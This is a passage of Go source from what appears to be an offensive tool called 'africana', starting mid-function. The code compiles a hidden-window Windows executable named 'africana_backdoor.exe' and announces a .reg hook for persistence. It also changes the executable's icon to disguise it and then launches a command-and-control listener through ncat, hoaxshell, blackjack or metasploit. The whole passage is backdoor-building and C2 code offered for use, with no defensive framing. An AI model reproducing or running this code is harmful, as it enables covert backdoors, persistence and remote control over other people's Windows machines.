    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_reg.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"
    fmt.Printf("\n%s[>] %shooking .exe with .reg for persistence ...\n", bcolors.Yellow, bcolors.Endc)

    spinner.Start()
    buildCmd := "go build -ldflags='-w -s -H windowsgui' -o %s %s"
    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)
    spinner.Stop()

    IconChanger(endMalwarePath, Icon)
    log.Printf("\n\n%s[+] %scomplete backdoor saved at: %s%s%s\n", bcolors.Green, bcolors.Endc, bcolors.BrightBlue, endMalwarePath, bcolors.Endc)
    ListenerLauncher(Lport, Hport, Protocol, C2)
}

func ListenerLauncher(Lport string, Hport string, Protocol string, C2 string) {
    fmt.Printf("\n%s[>] %sLaunching %sc2 ...", bcolors.Yellow, bcolors.Endc, C2)
    switch strings.ToLower(C2) {
    case "ncat":
        Ncat(Lport, Protocol)
        return
    case "hoaxshell":
        HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir)
        return
    case "blackjack":
        BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)
        return
    case "metasploit":
        Metasploit(Lhost, Lport, Protocol)
        return
    default:
        fmt.Printf("\n%s[!] %sError: Invalid LISTENER type", bcolors.BrightRed, bcolors.Endc)
    }
}
